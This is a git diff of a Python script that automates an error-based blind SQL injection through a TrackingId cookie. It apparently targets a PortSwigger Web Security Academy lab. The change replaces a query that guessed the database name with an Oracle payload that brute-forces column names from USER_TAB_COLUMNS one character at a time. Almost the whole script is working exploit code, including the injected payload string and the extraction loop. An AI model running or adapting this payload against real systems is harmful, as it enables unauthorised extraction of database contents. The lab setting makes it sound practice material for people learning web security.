@@ -1,11 +1,11 @@
 #!/usr/bin/python3
 ##
 import requests
-import pwn
 import re
 import string
 ##
 chars=string.ascii_uppercase+string.ascii_lowercase+string.digits+string.punctuation
+##
 ##
 def pwn(URL,session_cookie,TrackingId,session):
     value=""
@@ -13,7 +13,7 @@ def pwn(URL,session_cookie,TrackingId,session):
         tmp=value
         for X in chars:
             print(f"{X}\r",end="")
-            send=f"{TrackingId}'+and+1=(CASE+WHEN+(+and+database+like('{value}{X}%25'))+THEN+1+ELSE 1/0+END)--+-"
+            send=f"'+or+1=(SELECT+CASE+WHEN+(column_name+like('{value}{X}%25'))+THEN+1+ELSE 1/0+END+from+USER_TAB_COLUMNS+WHERE+ROWNUM=1+and+column_name<>'ID'+and+column_name<>'USERNAME')--+-"
             cookies=dict({
                 "TrackingId":send
                 })
@@ -31,7 +31,7 @@ def main(URL):
     r=sess.get(URL)
     session_cookie=r.cookies.get_dict()['session']
     trackingId=r.cookies.get_dict()['TrackingId']
-    user=pwn(URL,session_cookie,trackingId,sess)
-    print(f"The databse is: {user}")
+    cols=pwn(URL,session_cookie,trackingId,sess)
+    print(f"The collumns are:\n{cols}")
 ##
-main("https://0acb00f704b6c4888113110200e50094.web-security-academy.net/")
+main('https://0a000090043de8b681747263005900eb.web-security-academy.net/')
